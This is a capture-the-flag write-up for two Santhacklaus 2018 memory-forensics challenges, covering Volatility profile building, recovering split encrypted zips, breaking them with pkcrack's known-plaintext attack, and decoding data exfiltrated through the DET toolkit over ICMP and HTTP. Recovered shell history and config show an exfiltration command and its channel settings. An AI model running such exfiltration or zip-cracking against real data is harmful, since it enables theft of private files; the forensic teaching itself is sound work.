---
weight: 4
title:  "[Santhacklaus 2018] - Mission impossible"
date: 2018-12-19T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["santhacklaus", "pinkflood", "volatility", "linux", "profile", "zip", "det"]
categories: ["Writeups"]

lightgallery: true
---

## Mission impossible 1

### Statement

![](/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png)

<iframe width="560" height="315" src="https://www.youtube.com/embed/pEfI3ZrLDBs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

(Awesome work for the video, really appreciate it as a player)

### State of the art

A memory dump again :D


![](https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif)


```bash
$ volatility -f challenge.elf imageinfo
[...]
Take a looooooooong time 
[...]

$ strings challenge.elf | grep 'Linux version' | sort | uniq
2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Dec 16 11:14:09 virtual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Dec 16 11:14:09 virtual-debian kernel: [10295.865806] intel_idle: does noual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Linux version %d.%d.%d
MESSAGE=Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
```

Ok, it's a linux memory dump...


![](https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif)


### Profile generation

To do a linux profile for volatility, we need:

* Linux distribution
* Version of the distribution
* Version of the kernel

By greping on __Linux version__ we got those informations:

* Debian
* Debian 8 (the deb8u1)
* 3.16.0-6-amd64 kernel

I choose to download the latest release of Debian 8: https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso

Pro tip: Download the netinstall version of Linux, during installation, don't select any additional package except SSH.

When the Debian 8 VM is up, just ssh it and check the installed kernel:

```bash
$ ssh user@192.168.122.197

debianVM $ uname -a
Linux debian 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
```

It looks to be the right kernel, good. No need to install a new one. Now, install package for linux profile generation and generate it:

```bash
debianVM $ sudo apt-get install -y build-essential volatility-tools dwarfdump linux-headers-3.16.0-6-amd64

debianVM $ cd /usr/src/volatility-tools/linux/
debianVM $ su root
debianVM # make
debianVM # zip MI1_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-3.16.0-6-amd64
updating: usr/src/volatility-tools/linux/module.dwarf (deflated 91%)
updating: boot/System.map-3.16.0-6-amd64 (deflated 79%)
```

Our profile is created, we have to put in the right place for volatility:

```bash
$ sudo updatedb # I know it's deprectated :')
$ locate volatility | grep overlays | grep linux
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.py
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.pyc
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.py
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.pyc
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.py
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.pyc
```

Place the `MI1_profile.zip` archive in `/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux` folder.

```bash
$ volatility --info | grep MI1
LinuxMI1_profilex64   - A Profile for Linux MI1_profile x64
```

Let's try if it work, to do this, just use a linux volatility plugin, such as `linux_banner`:

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_banner
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
```

It works!


![](https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif)


MI1_profile.zip: https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc

### Raiders of the Lost Zip

What did the user on the system?

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_bash
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1867 bash                 2018-12-16 16:17:45 UTC+0000   rm flag.txt 
    1867 bash                 2018-12-16 16:17:45 UTC+0000   ls
    1867 bash                 2018-12-16 16:17:45 UTC+0000   ls
    1867 bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
    1867 bash                 2018-12-16 16:17:45 UTC+0000   zip -r -e -s 64K backup.zip *
    1867 bash                 2018-12-16 16:17:45 UTC+0000   cat /dev/urandom > flag.txt 
    1867 bash                 2018-12-16 16:17:45 UTC+0000   cd /var/www/a-strong-hero.com/
    1867 bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
    1867 bash                 2018-12-16 16:17:49 UTC+0000   cd /var/www/a-strong-hero.com/
    1867 bash                 2018-12-16 16:17:49 UTC+0000   ls
    1867 bash                 2018-12-16 16:18:09 UTC+0000   find . -type f -print0 | xargs -0 md5sum > md5sums.txt
    1867 bash                 2018-12-16 16:18:10 UTC+0000   cat md5sums.txt
```

Hmmm... What an ugly zip command. After reading the zip manual, actually this command will encrypt recursively and split the original archive into 64Ko pieces. In order to find all parts, let's list all file opened in memory:

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -L > filelist 

$ cat filelist | grep backup
          261933 0xffff88001e61e4b0 /var/www/a-strong-hero.com/backup.z02
          263120 0xffff88001e61e898 /var/www/a-strong-hero.com/backup.z05
          263122 0xffff88001e61ec80 /var/www/a-strong-hero.com/backup.z07
          263123 0xffff88001e61d0c8 /var/www/a-strong-hero.com/backup.z08
          263125 0xffff88001e61d4b0 /var/www/a-strong-hero.com/backup.zip
          261792 0xffff88001e61d898 /var/www/a-strong-hero.com/backup.z01
          262990 0xffff88001e61dc80 /var/www/a-strong-hero.com/backup.z04
          263121 0xffff88001e61c0c8 /var/www/a-strong-hero.com/backup.z06
          263124 0xffff88001e61c4b0 /var/www/a-strong-hero.com/backup.z09
          262949 0xffff88001e61cc80 /var/www/a-strong-hero.com/backup.z03
```

I think I found all pieces! Let's extract them and recreate the original archive:

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88001e61d898 -O backup.z01
[...]
Reproduce the operation with correct offset until the z09
[...]

$ zip -s 0 backup.zip --out unsplit.zip

$ unzip -l unsplit.zip 
Archive:  unsplit.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       30  2018-12-16 16:57   flag.txt
        0  2018-12-16 15:51   jcvd-website/
        0  2018-12-16 15:51   jcvd-website/js/
     6148  2018-12-16 15:51   jcvd-website/js/.DS_Store
    36816  2018-12-16 15:51   jcvd-website/js/bootstrap.min.js
    95957  2018-12-16 15:51   jcvd-website/js/jquery-1.11.3.min.js
    68890  2018-12-16 15:51   jcvd-website/js/bootstrap.js
       79  2018-12-16 15:51   jcvd-website/js/custom.js
      641  2018-12-16 15:51   jcvd-website/js/ie10-viewport-bug-workaround.js
     5564  2018-12-16 15:51   jcvd-website/js/jquery.easing.min.js
    12292  2018-12-16 15:51   jcvd-website/.DS_Store
        0  2018-12-16 15:51   jcvd-website/images/
    37682  2018-12-16 15:51   jcvd-website/images/concert.jpg
     6148  2018-12-16 15:51   jcvd-website/images/.DS_Store
    52003  2018-12-16 15:51   jcvd-website/images/microphone.jpg
    49276  2018-12-16 15:51   jcvd-website/images/iphone.jpg
    91733  2018-12-16 15:51   jcvd-website/images/header.jpg
    26267  2018-12-16 15:51   jcvd-website/images/writing.jpg
   133773  2018-12-16 15:51   jcvd-website/images/pencil_sharpener.jpg
     7384  2018-12-16 15:51   jcvd-website/index.html
        0  2018-12-16 15:51   jcvd-website/fonts/
    45404  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.ttf
    18028  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff2
    23424  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff
    20127  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.eot
   108738  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.svg
        0  2018-12-16 15:51   jcvd-website/css/
     6148  2018-12-16 15:51   jcvd-website/css/.DS_Store
   147430  2018-12-16 15:51   jcvd-website/css/bootstrap.css
     8335  2018-12-16 15:51   jcvd-website/css/custom.css
   122540  2018-12-16 15:51   jcvd-website/css/bootstrap.min.css
---------                     -------
  1130857                     31 files
```

The archive is password protected, but we can break pkzip encryption with known plaintext attack using `pkcrack`. I need a clear file and the same file encrypted in the zip archive. I choosed `microphone.jpg`.

```bash
$ cat filescan | grep microphone.jpg    
          261768 0xffff88003ce0f898 /var/www/a-strong-hero.com/jcvd-website/images/microphone.jpg

$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003ce0f898 -O microphone.jpg

$ zip micro.zip microphone.jpg

$ pkcrack-1.2.2/src/pkcrack -C unsplit.zip -c "jcvd-website/images/microphone.jpg" -P micro.zip -p "microphone.jpg" -d bitedepoulet.zip -a
Done. Left with 96 possible Values. bestOffset is 40412.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Decrypting flag.txt (91c644af94249dd314b62b57)... OK!
Decrypting jcvd-website/js/.DS_Store (2fe6d64c750f20da2d6b7b4e)... OK!
Decrypting jcvd-website/js/bootstrap.min.js (31beae5a6417af2fcee27b4e)... OK!
Decrypting jcvd-website/js/jquery-1.11.3.min.js (68cffaef64b77eca810f7b4e)... OK!
Decrypting jcvd-website/js/bootstrap.js (172450e6004efe284b507b4e)... OK!
Decrypting jcvd-website/js/custom.js (4038fc0d73419d37a34f7b4e)... OK!
Decrypting jcvd-website/js/ie10-viewport-bug-workaround.js (71f134fe12dcf4d413c17b4e)... OK!
Decrypting jcvd-website/js/jquery.easing.min.js (dd66d46318af5411b24b7b4e)... OK!
Decrypting jcvd-website/.DS_Store (ccc90b8c7a949b1dd0297b4e)... OK!
Decrypting jcvd-website/images/concert.jpg (2531ab52a4c3f2af90017b4e)... OK!
Decrypting jcvd-website/images/.DS_Store (cd53bfa34fee99aade507b4e)... OK!
Decrypting jcvd-website/images/microphone.jpg (e04e73cca1576915c96f7b4e)... OK!
Decrypting jcvd-website/images/iphone.jpg (7d0e3ddec5bb0eb5d5537b4e)... OK!
Decrypting jcvd-website/images/header.jpg (558cd122c491a4c95df47b4e)... OK!
Decrypting jcvd-website/images/writing.jpg (de9b24799ceac1377f317b4e)... OK!
Decrypting jcvd-website/images/pencil_sharpener.jpg (89cbb73d79aa6c0472607b4e)... OK!
```

The archive is not fully decrypted, there are some glitch. But it's not a problem because `flag.txt` is properly decrypted! Then you just have to `strings` the new archive.

### Flag

```bash
$ strings bitedepoulet.zip | grep IMTLD
IMTLD{z1p_1s_n0t_alw4y5_s4fe}
```

## Mission impossible 2

### Statement


![](/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png)


<iframe width="560" height="315" src="https://www.youtube.com/embed/NA2UkAcXdL0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


(Awesome work again for the video :D)

### State of the art

We got again a Debian memory dump, fortunately it's the same profile for the `Mission impossible 1` and this one.

```bash
$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_banner
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)

$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_bash
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cd DET/
    1715 bash                 2018-11-09 22:56:08 UTC+0000   nano config.json 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo pip install -r requirements.txt 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cd /opt/
    1715 bash                 2018-11-09 22:56:08 UTC+0000   ls -alh
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo git clone https://github.com/sensepost/DET
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo python det.py -c config.json -p icmp,http -f flag.zip 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   rm flag.zip 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cp config-sample.json config.json 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   zip flag.zip flag.jpg -P IMTLD{N0t_Th3_Fl4g}
    1715 bash                 2018-11-09 22:56:08 UTC+0000   rm flag.jpg 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo chown -R evil-hacker:evil-hacker /opt/DET/
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg .
    1715 bash                 2018-11-09 22:56:47 UTC+0000   history
    1715 bash                 2018-11-09 22:57:12 UTC+0000   cd /opt/DET/
    1715 bash                 2018-11-09 22:57:48 UTC+0000   find . -type f -print0 | xargs -0 md5sum md5sums.txt
    1715 bash                 2018-11-09 22:57:57 UTC+0000   find . -type f -print0 | xargs -0 md5sum > md5sums.txt
```

Owh! The user is used DET (Data Exfiltration Toolkit), a little client / server for data exfiltration made by @PaulWebSec: https://github.com/sensepost/DET

So, the evil hacker exfiltrates his data through ICMP and HTTP, according to the bash history. Fortunately, it's what we got in the PCAP:


![](/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png)


* red framed shows the ICMP data
* green framed shows the HTTP data

### How DET works?

It uses a configuration file `config.json`:

```bash
$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -L > filelist

$ cat filelist | grep config.json
          672629 0xffff88003c16ec80 /opt/DET/config.json

$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003c16ec80 -O config.json

$ cat config.json
{
    "plugins": {
        "http": {
            "target": "192.168.0.29",
            "port": 8080
        },
        "google_docs": {
            "target": "SERVER",
            "port": 8080
        },        
        "dns": {
            "key": "google.com",
            "target": "192.168.0.29",
            "port": 53
        },
        "gmail": {
            "username": "dataexfil@gmail.com",
            "password": "CrazyNicePassword",
            "server": "smtp.gmail.com",
            "port": 587
        },
        "tcp": {
            "target": "192.168.0.29",
            "port": 6969
        },
        "udp": {
            "target": "192.168.0.29",
            "port": 6969
        },
        "twitter": {
            "username": "PaulWebSec",
            "CONSUMER_TOKEN": "XXXXXXXXXXX",
            "CONSUMER_SECRET": "XXXXXXXXXXX",
            "ACCESS_TOKEN": "XXXXXXXXXXX",
            "ACCESS_TOKEN_SECRET": "XXXXXXXXXXX"
        },
        "icmp": {
            "target": "192.168.0.29"
        },
        "slack": {
            "api_token": "xoxb-XXXXXXXXXXX",
            "chan_id": "XXXXXXXXXXX",
            "bot_id": "<@XXXXXXXXXXX>:"
        }
    },
    "AES_KEY": "IMTLD{This_is_just_a_key_not_the_flag}",
    "max_time_sleep": 10,
    "min_time_sleep": 1,
    "max_bytes_read": 400,
    "min_bytes_read": 300,
    "compression": 1
}
```

So, now we got those informations:

* AES Key: IMTLD{This_is_just_a_key_not_the_flag}
* We know it uses DET compression (zlib)

### How data are exfiltrated?

This is what it looks like in HTTP packets:


![](/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png)


With a little `tshark` command I was able to extract all base64:

```bash
$ tshark -r challenge.pcapng -Y http -Tfields -e urlencoded-form.value > data_http.b64

$ cat data_http.b64 | base64 -d | less
z6f9HaX|!|1|!|246760c25e3f659efe1b8299032616c0a6c92ce1d72addcf01183fd535d83abc5ce238d49d9bd255e8be9161ba00ab68a5dc2882c9159d055002085b7c0bb55b5ffe596b9229ac6280acacec248d187b2559fc4e1d8eb2a2711aeaf96616b52c39410d6423f877817cdb8e827086badbf1390331c87e2291c56756f696f4f02bb26d2ccf93c906c91ddebe9a2f68086e679a3c562217646afe79227ef5b9c485ffaef859fe42c35e4627a63c017d39b5e8d11fb32ddce0d88cbbb5a74c0215e3be78de850fa30b0b03cffaa041096810459559864c9f0bc0ac4e214c58ca8b89b73248130f096005a00b555d028d8c8cd7f69e57d6f925c2ea262a3b067d809dfaf8f825e7c4b8e02a54376d5d209a1e15a3866f544a03917a80cc183def3b6fac629a5e6fbdcbcf6cbe0a1713791651fbf6cd1917601b18709e3738bc03c4ba8ce55f13df90ed4603bb1d86de0fa4ab8d36a4ab010477e3270d31439e446d872730
z6f9HaX|!|5|!|8f7507923c3481c900f9d0c2b84b9517b1b0bf488148a9759bf26205c6471295e591587ae7d11d871bd31080b390d444d972a60eb799d3ea8ac7da599695588c8052a5d14ea1aa93ae6af1d6f76f4d62483a60f1c6e3713d31245f1817699695f1cb44e4b4ce1a6737cab1ac04f17a21d1053be83a6a59bc287ee5a42a7ec6dff033645715ef41e72bcf7495fcf04785c7612bd64def432940f13959c73d9cf79fb364ba6a5a891a713abb58bde1486caf187f9a398078c0744652838059ce0d10b903279692f0513e0f88af96796d85ab2f712866c2d8637a746e0d228bb736384e6c43ef253a0aa7cfba1219ce2393ce57bcf05b53a858858a665bc80d46c51289dcb6e9674c30563d03bbb80221e714349ffadf19afcce37206b8da66ef5f7fb2f3739c64f9699536ff545b73a6d37de627cb
[...]

$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.data | tr -d ':' | xxd -r -p | sed 's/ejZmO/\nejZmO/g' > data_icmp.b64

$ cat data_icmp.b64 | base64 -d | less
z6f9HaX|!|flag.zip|!|REGISTER|!|3682490664d5bf7905397710edb84737
z6f9HaX|!|0|!|f8e946873b6e3a34035d82b1aadec650edc693c449b064a06bd1c7432e801193b497f998d1265e7e9da7b4ea56d650ae0dfbd717ef4dd1418d2d9b4e68b835f166643a705acd64c60e56add715a064524363bff1152aae8c2b2e82548c7f7f0f69690d18733e42de352ce5bb6fd5b2b696688ad84a80d3862cab8274d4b5a79065f4be827f36cd0271ae6ed1306107437e26bbdfce7fcfe3d0840e03a4bb5b776b5501582240cbaeccc8c6969653973805209cdcdc2e2c70325cabf8ecc8ad7f192b8b0d7c0bde5489a10e23175a4e593641862d625145d3a9f1b8de163325c534bc6c303109f63b2bd7ea5bdd22cefd8e1415b8374811c5d656eac67b924e2f7f170821b77361513ad6d9e0972641f83a8cac5776e09320b657dd0c1d6449c19c032d77d92c80fa991e9eefc585aab8e7a5feb56ea7
z6f9HaX|!|2|!|3de71e0826b4f3c85d0b17931d2effd04913e6320e30e73f5cc652c9e3a7f3bb4bbce092648283324298d594aae4f8bfa73732b492e479c4d1d642310ce0a3344186f9bc21ac86833010ef2bd6b2e31b9251690902b660448f88b9dc48963270d603942fc5910715d0d4f18224316f571116e05be4f0404f468ef856eab4ad6f38683aa0b935d0bc9933231d3262b54aca672be1fd2cb0d59fc49c807de24dc582501396dd54b67efe2fe7687b0c62de63de5c278200c3288269729cf7428fc0b48298699a808a141fc3bee1ba01a90c51faed07c3d35149c5988f9301e2e70a9d955b1545581522f90f4a2e9c88cf8e502bca12128ba0cb77409220c259035bc3ca1727e017713abb08b9491675f20bad831ba685edaefa572ca8da0c56bfb3615048a0764305dc219936237f5764cdc1031d024591c66ef92d38bbe9a73614411e27z6f9HaX|!|3|!|8037dbd29c0393e519050999210fe5ce63880109a09bf879b09b8b9f952d438d51d8b54
[...]
```

Ok, the data follow the following pattern:

> ID|!|number|!|AES encrypted data

### Scripting and decryption time

According the previous scenarios, I just have to sort all packet by number, extract encrypted data and decrypt / decompress it.

Here is my quick and dirty script:

```python
#!/usr/bin/python2

from base64 import b64decode
from Crypto.Cipher import AES
import hashlib
from zlib import compress, decompress

# Function from DET Github
def aes_decrypt(message,key):
    iv = message[:AES.block_size]
    message = message[AES.block_size:]
    aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
    message = aes.decrypt(message)
    unpad = lambda s: s[:-ord(s[len(s)-1:])]
    return unpad(message)

tmp = {}

f = open('data_http.b64','r')
data_http = f.read()
f.close()

data_http = filter(bool, data_http.split('\n'))

clear_http = []

for i in data_http:
  clear_http.append(b64decode(i))

# Dictionnary creation from http data
for i in range(0,len(clear_http)):
  tmp[int(clear_http[i].split('|')[2])] = clear_http[i].split('|')[4]

g = open('data_icmp.b64','r')
data_icmp = g.read().split('\n')
g.close()

clear_icmp = []
for i in data_icmp:
  clear_icmp.append(b64decode(i))

clear_icmp.pop(0)
clear_icmp.pop(0)

# Dictionnary append with icmp data
for j in range(0,len(clear_icmp)):
  tmp[int(clear_icmp[j].split('|')[2])] = clear_icmp[j].split('|')[4]

final = ""

for i in range(0,len(tmp)):
  final += tmp[i]

final = final[:-4]
flag = aes_decrypt(final.decode('hex'),"IMTLD{This_is_just_a_key_not_the_flag}")
flag = decompress(flag) # zlib decompression

h = open('flag.dat','wb')
h.write(flag)
h.close()
print "[+] flag.dat written :)"
```

```bash
$ ./decrypt.py 
[+] flag.dat written :)

$ file flag.dat 
flag.dat: Zip archive data, at least v2.0 to extract

$ unzip -l flag.dat                                                
Archive:  flag.dat
  Length      Date    Time    Name
---------  ---------- -----   ----
    25369  2018-11-09 22:34   flag.jpg
---------                     -------
    25369                     1 file

$ unzip flag.dat
Archive:  flag.dat
[flag.dat] flag.jpg password: IMTLD{N0t_Th3_Fl4g}
  inflating: flag.jpg

$ file flag.jpg 
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 706x396, components 1
```

### Flag


![](/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_3.jpg)
